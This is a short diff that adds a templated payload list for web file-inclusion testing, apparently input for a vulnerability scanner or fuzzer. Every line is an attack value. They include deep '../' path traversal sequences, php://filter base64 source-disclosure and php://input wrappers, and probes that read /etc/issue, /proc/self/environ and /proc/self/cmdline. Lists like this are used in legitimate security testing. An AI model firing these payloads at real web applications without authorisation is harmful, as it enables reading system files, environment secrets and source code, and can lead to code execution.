@@ -1,0 +1,14 @@
+[FOO]=./[BAR]
+[FOO]=../../[BAR]
+[FOO]=.././../[BAR]
+[FOO]=[BAR]PATATA
+[FOO]=PATATA
+[FOO]=php://filter/convert.base64-encode/resource=[BAR]
+[FOO]=php://input
+[FOO]=/etc/issue
+[FOO]=../../../../../../../../../../../../../../../../../../../../../../../etc/issue
+[FOO]=/proc/self/environ
+[FOO]=/proc/self/cmdline
+[FOO]=../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ
+[FOO]=../../../../../../../../../../../../../../../../../../../../../../../proc/self/cmdline
+[FOO]=.././.././.././.././.././.././.././.././.././.././.././.././.././.././.././proc/./self/./environ
